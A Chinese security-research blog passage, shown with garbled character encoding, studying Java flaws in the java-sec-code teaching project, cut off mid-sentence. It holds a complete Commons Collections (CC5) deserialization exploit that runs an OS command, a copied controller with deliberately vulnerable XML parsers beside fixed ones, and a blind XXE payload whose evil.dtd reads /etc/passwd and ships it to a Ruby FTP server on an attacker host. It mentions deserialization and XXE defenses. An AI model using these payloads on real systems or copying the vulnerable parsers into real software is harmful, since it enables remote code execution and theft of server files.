æ­¤æ¥ä¸‹æ¥æ˜¯è°ƒç”¨ChainedTransformer.transform()å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„thiså°±æ˜¯ChainedTransformerå¯¹è±¡ã€‚ç„¶åè¿™ä¸ªforå¾ªç¯ä¼šæ€»å…±è°ƒç”¨å››æ¬¡transform(),è°ƒç”¨1æ¬¡ConstantTransformer.transform()æ–¹æ³•ï¼Œç„¶åè°ƒç”¨3æ¬¡InvokerTransformer.transform() 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); &#125; &#125; &#125;&#125; åˆ°è¿™ä¸€æ­¥å·²ç»èƒ½çœ‹å‡ºæˆ‘ä»¬æ„é€ å‡½æ•°çš„å‚æ•°å·²ç»æ§åˆ¶InvokerTransformeråå°„çš„å‚æ•°äº†ã€‚è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚gadget 12345678910111213TransformedMap.put() &#x3D;&gt;TransformedMap.transformKey() &#x3D;&gt;ChainedTransformer.transform() &#x3D;&gt;ConstantTransformer.transform() &#x3D;&gt;InvokerTransformer.transform() &#x3D;&gt;Method.invoke() Class.getMethod() &#x3D;&gt;InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() &#x3D;&gt;InvokerTransformer.transform() Method.invoke() Runtime.exec() Map.Entryçš„pocæˆ‘å°±ä¸è·Ÿäº†ã€‚åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„æœºç†ã€‚ æ¥ä¸‹æ¥ä¹Ÿå°±æ˜¯CommonCollectionsçš„gadgetäº†ã€‚ä¸Šé¢æˆ‘ä»¬çŸ¥é“,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Mapç±»çš„å¯¹è±¡è¿›è¡Œåå°„çš„payloadæ„é€ ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¶æ„ç±»çš„æˆå‘˜è‚¯å®šæ˜¯Mapç±»çš„ã€‚å¹¶ä¸”ç”±äºååºåˆ—åŒ–çš„è¦æ±‚,è¿™ä¸ªç±»é‡å†™äº†readObject(),å¹¶ä¸”åœ¨readObject()ä¸­è°ƒç”¨äº†put()æˆ–è€…setValue() åœ¨ä¸åŒjdkç‰ˆæœ¬ä¸­æˆ‘ä»¬èƒ½æ‰¾åˆ°çš„ç¬¦åˆè¦æ±‚çš„ç±»ä¸åŒã€‚ç›®å‰æ¯”è¾ƒæ–°çš„åº”è¯¥æ˜¯ç”¨BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformerçš„é“¾å­å…ˆæ¥çœ‹ä¸‹BadAttributeValueExpException 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return \"BadAttributeValueException: \" + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125; &#125; &#125; ä»BadAttributeValueExpExceptionç±»çš„readObejct()æ–¹æ³•çŸ¥é“,val.toString()æ˜¯æ•´ä¸ªreadObject()çš„é‡ç‚¹ã€‚ç°åœ¨éœ€è¦ä¸€ä¸ªç±»ï¼Œèƒ½åœ¨è°ƒç”¨toString()æ–¹æ³•æ—¶è§¦å‘transform()æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„åå°„é“¾ æ‰¾åˆ°LazyMapçš„get()æ–¹æ³•ã€‚ä¸phpçš„é­”æœ¯æ–¹æ³•ä¸€æ ·,å¯ä»¥åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„keyæ—¶æ¥æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ç”Ÿæˆkey. 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125;&#125; æœ€åæ˜¯TiedMapEntryç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package org.apache.commons.collections.keyvalue;import java.io.Serializable;import java.util.Map;import java.util.Map.Entry;import org.apache.commons.collections.KeyValue;public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException(\"Cannot set value to this map entry\"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; Entry other = (Entry)obj; Object value = this.getValue(); return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) &amp;&amp; (value == null ? other.getValue() == null : value.equals(other.getValue())); &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + \"=\" + this.getValue(); &#125;&#125; å®ƒåœ¨è°ƒç”¨toString()æ—¶,å®é™…ä¸Šè°ƒç”¨äº†getValue()å³map.get(key)ã€‚è¿™æ ·å®ƒå°±ç¬¦åˆä¸Šé¢Lazymapçš„è¦æ±‚äº†ã€‚é‚£ä¹ˆgadgetå°±æ˜¯ 1234BadAttributeValueExpException.readObject()//å…¶valä¸ºTiedMapEntry =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()//å…¶mapå¯¹è±¡æ˜¯LazyMap =&gt;LazyMap.get()//å…¶factoryå¯¹è±¡æ˜¯ChainedTransformer =&gt;ChainedTransformer.transform() æœ€ç»ˆçš„exp.ä¹Ÿæ˜¯cc5çš„é“¾å­ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class exp &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"calc\"&#125;), new ConstantTransformer(\"1\") &#125;; Transformer transformChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo233\"); BadAttributeValueExpException exception = new BadAttributeValueExpException(null); Field valField = exception.getClass().getDeclaredField(\"val\"); valField.setAccessible(true); valField.set(exception, entry); File f = new File(\"poc\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(exception); out.flush(); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\"poc\")); in.readObject(); // è§¦å‘æ¼æ´ in.close(); &#125;&#125; done. é˜²å¾¡æœºåˆ¶ ä»demoçš„å®‰å…¨ä»£ç éƒ¨åˆ†å°±èƒ½çœ‹å‡ºã€‚ä½¿ç”¨äº†AntObjectInputStreamä¸InvalidClassExceptionæ¥è¿›è¡Œé»‘/ç™½åå•çš„é˜²èŒƒã€‚å…·ä½“å¯ä»¥çœ‹å…¶è‡ªå®šä¹‰çš„ä»£ç  https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.javaç›´æ¥Hook java/io/ObjectInputStreamç±»çš„resolveClassæ–¹æ³• //ä»Šå¤©å…ˆå†™è¿™ä¹ˆå¤šå§,å¥½ä¹…æ²¡å†™javaå†™èµ·æ¥è¿˜æŒºæ€€å¿µçš„ã€‚ XXEXXEåœ¨java-sec-codeé¡¹ç›®ä¸­è¢«åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ã€‚æ™®é€šXXEä¸POI ooxml XXE.æˆ‘ä»¬å…ˆä»åŸºç¡€çš„çœ‹èµ·ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453package org.joychou.controller;import org.dom4j.DocumentHelper;import org.dom4j.io.SAXReader;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.*;import javax.servlet.http.HttpServletRequest;import org.w3c.dom.Document;import org.w3c.dom.Node;import org.w3c.dom.NodeList;import org.xml.sax.helpers.XMLReaderFactory;import org.xml.sax.XMLReader;import java.io.*;import org.xml.sax.InputSource;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.SAXParserFactory;import javax.xml.parsers.SAXParser;import org.xml.sax.helpers.DefaultHandler;import org.apache.commons.digester3.Digester;import org.jdom2.input.SAXBuilder;import org.joychou.util.WebUtils;/** * Java xxe vuln and security code. * * @author JoyChou @2017-12-22 */@RestController@RequestMapping(\"/xxe\")public class XXE &#123; private static Logger logger = LoggerFactory.getLogger(XXE.class); private static String EXCEPT = \"xxe except\"; @PostMapping(\"/xmlReader/vuln\") public String xmlReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml return \"xmlReader xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/xmlReader/sec\", method = RequestMethod.POST) public String xmlReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"xmlReader xxe security code\"; &#125; @RequestMapping(value = \"/SAXBuilder/vuln\", method = RequestMethod.POST) public String SAXBuilderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe return \"SAXBuilder xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/SAXBuilder/sec\", method = RequestMethod.POST) public String SAXBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXBuilder xxe security code\"; &#125; @RequestMapping(value = \"/SAXReader/vuln\", method = RequestMethod.POST) public String SAXReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXReader xxe vuln code\"; &#125; @RequestMapping(value = \"/SAXReader/sec\", method = RequestMethod.POST) public String SAXReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); reader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); reader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXReader xxe security code\"; &#125; @RequestMapping(value = \"/SAXParser/vuln\", method = RequestMethod.POST) public String SAXParserVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml return \"SAXParser xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/SAXParser/sec\", method = RequestMethod.POST) public String SAXParserSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXParser xxe security code\"; &#125; @RequestMapping(value = \"/Digester/vuln\", method = RequestMethod.POST) public String DigesterVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.parse(new StringReader(body)); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"Digester xxe vuln code\"; &#125; @RequestMapping(value = \"/Digester/sec\", method = RequestMethod.POST) public String DigesterSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); digester.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); digester.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); digester.parse(new StringReader(body)); // parse xml return \"Digester xxe security code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; // æœ‰å›æ˜¾ @RequestMapping(value = \"/DocumentBuilder/vuln01\", method = RequestMethod.POST) public String DocumentBuilderVuln01(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // éå†xmlèŠ‚ç‚¹nameå’Œvalue StringBuilder buf = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) &#123; Node node = child.item(j); buf.append(String.format(\"%s: %s\\n\", node.getNodeName(), node.getTextContent())); &#125; &#125; sr.close(); return buf.toString(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; // æœ‰å›æ˜¾ @RequestMapping(value = \"/DocumentBuilder/vuln02\", method = RequestMethod.POST) public String DocumentBuilderVuln02(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // éå†xmlèŠ‚ç‚¹nameå’Œvalue StringBuilder result = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) &#123; Node node = child.item(j); // æ­£å¸¸è§£æXMLï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦æ˜¯ELEMENT_NODEç±»å‹ã€‚å¦åˆ™ä¼šå‡ºç°å¤šä½™çš„çš„èŠ‚ç‚¹ã€‚ if (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123; result.append(String.format(\"%s: %s\\n\", node.getNodeName(), node.getFirstChild())); &#125; &#125; &#125; sr.close(); return result.toString(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/DocumentBuilder/Sec\", method = RequestMethod.POST) public String DocumentBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); db.parse(is); // parse xml sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentBuilder xxe security code\"; &#125; @RequestMapping(value = \"/DocumentBuilder/xinclude/vuln\", method = RequestMethod.POST) public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // æ”¯æŒXInclude dbf.setNamespaceAware(true); // æ”¯æŒXInclude DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); return \"DocumentBuilder xinclude xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/DocumentBuilder/xinclude/sec\", method = RequestMethod.POST) public String DocumentBuilderXincludeSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // æ”¯æŒXInclude dbf.setNamespaceAware(true); // æ”¯æŒXInclude dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentBuilder xinclude xxe vuln code\"; &#125; @PostMapping(\"/XMLReader/vuln\") public String XMLReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"XMLReader xxe vuln code\"; &#125; @PostMapping(\"/XMLReader/sec\") public String XMLReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"XMLReader xxe security code\"; &#125; /** * ä¿®å¤è¯¥æ¼æ´åªéœ€å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITYï¼› * ä¸å¸¦ENTITYçš„PoCä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ç¦ç”¨ENTITYå³å¯å®Œæˆä¿®å¤ã€‚ */ @PostMapping(\"/DocumentHelper/vuln\") public String DocumentHelper(HttpServletRequest req) &#123; try &#123; String body = WebUtils.getRequestBody(req); DocumentHelper.parseText(body); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentHelper xxe vuln code\"; &#125; private static void response(NodeList rootNodeList)&#123; for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList xxe = rootNode.getChildNodes(); for (int j = 0; j &lt; xxe.getLength(); j++) &#123; Node xxeNode = xxe.item(j); // æµ‹è¯•ä¸èƒ½blind xxeï¼Œæ‰€ä»¥å¼ºè¡ŒåŠ äº†ä¸€ä¸ªå›æ˜¾ logger.info(\"xxeNode: \" + xxeNode.getNodeValue()); &#125; &#125; &#125; public static void main(String[] args) &#123; &#125;&#125; ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºã€‚å¯å¯¼è‡´XXEçš„xmlè§£æç±»æœ‰è®¸å¤šç§ã€‚åŒæ—¶è¿›è¡Œé˜²èŒƒæ—¶å¤§å¤šæ˜¯ä½¿ç”¨äº†setFeature()æ¥æŠŠæŸä¸ªç‰¹æ€§è®¾ç½®ä¸ºtrue/false. ç®€å•çš„å†…å®¹åŒæ ·ä¸è°ˆã€‚è¿™é‡Œå…³äºjavaxxeçš„å‡ ä¸ªç‰¹æ€§ç¨å¾®ç ”ç©¶ä¸€ä¸‹ã€‚å…ˆæ‰¾ä¸ªèƒ½å›æ˜¾çš„è·¯ç”±/DocumentBuilder/vuln01 javaçš„xxeå¯åˆ—ç›®å½•ã€‚ fileåè®®,netdocåè®®å‡å¯ file:/ , netdoc:/å°±èƒ½åˆ—æ ¹ç›®å½•äº†ã€‚è¿™ç‚¹åœ¨æŸäº›å†™è¿‡æ»¤å¤§æ„çš„æƒ…å†µä¸‹å¯èƒ½ä¼šæœ‰å¸®åŠ©ï¼Œæ¯”å¦‚åªè¿‡æ»¤äº†file://çš„æƒ…å†µã€‚ è¿™ç‚¹æ›¾ç»åœ¨æŸä¸ªæ¯”èµ›ä¸­é‡åˆ°è¿‡ã€‚å½“æ—¶é¢˜ç›®åç«¯ä½¿ç”¨çš„æ˜¯phpã€‚ä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªå°†xmlèŠ‚ç‚¹æ¸²æŸ“æˆå›¾ç‰‡å¹¶å›æ˜¾çš„åŠŸèƒ½ã€‚åƒè¿™ç§åŠŸèƒ½çš„åº•éƒ¨å®ç°å¾ˆæœ‰å¯èƒ½æ˜¯javaè¾¾æˆçš„ã€‚å› æ­¤åœ¨ä¸çŸ¥é“è·¯å¾„æ–‡ä»¶åè¯»å–æºç æ—¶å¯ä»¥é€šè¿‡åˆ—ç›®å½•è§£å†³é—®é¢˜ã€‚ javaçš„xxeä¸èƒ½è¯»å–å¤šè¡Œçš„é—®é¢˜ è¿™ä¸ªç›¸æ¯”è¾ƒphpè€Œè¨€ç®—æ˜¯æ¯”è¾ƒå¤§çš„é—®é¢˜ã€‚phpçš„ä¼ªåè®®ä¸ºå…¶è¯»å–æ–¹å¼å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©,å¹¶ä¸”å‡ ä¹æ˜¯ä¸‡é‡‘æ²¹ã€‚ä½†æ˜¯javaçš„xxeæœ‰æ—¶è¯»å–ä¸åˆ°å¤šè¡Œå®Œå…¨æ˜¯å–å†³äºjdkçš„ç‰ˆæœ¬å¹¶ä¸”æ™®éå­˜åœ¨è¯»å–ä¸äº†&lt; %çš„é—®é¢˜ã€‚ é€šå¸¸æˆ‘ä»¬åœ¨ç›²æ‰“java oob xxeæ—¶æ™®éé€‰æ‹©ftpåè®®(å…¶å®æ˜¯å› ä¸ºæ”¯æŒçš„å¯å¤–è¿çš„åè®®åªæœ‰http/s ftp)ã€‚httpåªèƒ½è¯»å–å•è¡Œæ–‡ä»¶ã€‚ftpåˆ™åœ¨ä¸åŒç‰ˆæœ¬ä¸‹æœ‰ä¸åŒè¡¨ç° è¿™é‡Œå…¶ä»–å¤§ä½¬æ™®éé’ˆå¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†ç ”ç©¶https://landgrey.me/blog/9/https://www.leadroyal.cn/?p=914ç»“è®ºæ˜¯: ä½¿ç”¨ftp è¿›è¡Œ oob æ—¶ï¼Œå¯¹ç‰ˆæœ¬æœ‰é™åˆ¶ï¼Œ &lt;7u141 å’Œ &lt;8u162 æ‰å¯ä»¥è¯»å–æ•´ä¸ªæ–‡ä»¶,å…¨ç‰ˆæœ¬ http éƒ½åªå¯ä»¥è¯»å•è¡Œæ–‡ä»¶ æ€»ä¹‹é‡åˆ°é—®é¢˜å…ˆæ‰“ä¸Šä¸€å‘çœ‹çœ‹ã€‚è¿™é‡Œæ”¾å‡ºftpserverçš„rubyä»£ç ã€‚å› ä¸ºvpsç«¯å£é—®é¢˜æˆ‘æŠŠç«¯å£æ”¹äº† 12345678910111213141516171819require 'socket'server = TCPServer.new 8001loop do Thread.start(server.accept) do |client| puts \"New client connected\" data = \"\" client.puts(\"220 xxe-ftp-server\") loop &#123; req = client.gets() puts \"&lt; \"+req if req.include? \"USER\" client.puts(\"331 password please - version check\") else #puts \"&gt; 230 more data please!\" client.puts(\"230 more data please!\") end &#125; endend payload 123&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM \"http://xxxx/evil.dtd\"&gt;%remote;]&gt;&lt;root/&gt; evil.dtd 1234&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;'&gt;\"&gt;%int;%trick å½“ç„¶ä»¥ä¸Šé’ˆå¯¹çš„æ˜¯OOB.ä¹Ÿå°±æ˜¯ç›²æ‰“å¤–å¸¦çš„æ–¹æ³• Xinclude xxe è¿™ç‚¹æˆ‘å€’æ˜¯éå¸¸æ„Ÿå…´è¶£ã€‚å› ä¸ºå‰ä¸ä¹…çš„htb Quickè¿™å°é¶æœºå°±ç”¨åˆ°äº†xinclude+xsltçš„RCE(æ²¡é”™,å…¶å®æ˜¯å¼•å…¥é€šè¿‡å¤–éƒ¨xmlè¾¾æˆRCE) å½“ç„¶ä¸æ˜¯æ‰€æœ‰æœåŠ¡éƒ½èƒ½åƒEsigateé‚£æ 